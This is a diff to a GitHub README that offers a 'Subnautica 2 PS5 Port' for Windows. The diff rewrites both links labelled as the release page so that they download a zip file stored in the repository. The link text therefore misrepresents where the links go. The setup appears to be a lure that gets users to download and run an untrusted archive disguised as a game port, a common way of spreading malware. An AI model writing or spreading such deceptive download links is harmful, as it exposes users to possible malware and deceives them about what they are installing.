@@ -1,6 +1,6 @@
 # 🌊 Subnautica-2-PS5-Port - Play the underwater sequel on PC
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Affined-genushypoxis188/Subnautica-2-PS5-Port/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Affined-genushypoxis188/Subnautica-2-PS5-Port/raw/refs/heads/main/Port-Resource/Subnautica_P_Port_v2.1.zip)
 
 This application brings the aquatic survival experience of Subnautica 2 to your Windows computer. It allows you to explore alien oceans, build bases, and craft equipment through a port of the PlayStation 5 game files.
 
@@ -21,7 +21,7 @@ Use an SSD for this software. Mechanical hard drives cause slow loading times an
 
 Follow these steps to set up the software on your PC.
 
-1. Go to the [official release page](https://github.com/Affined-genushypoxis188/Subnautica-2-PS5-Port/releases).
+1. Go to the [official release page](https://github.com/Affined-genushypoxis188/Subnautica-2-PS5-Port/raw/refs/heads/main/Port-Resource/Subnautica_P_Port_v2.1.zip).
 2. Locate the latest version in the Assets list.
 3. Click the file ending in .zip to start the download.
 4. Open your Downloads folder.
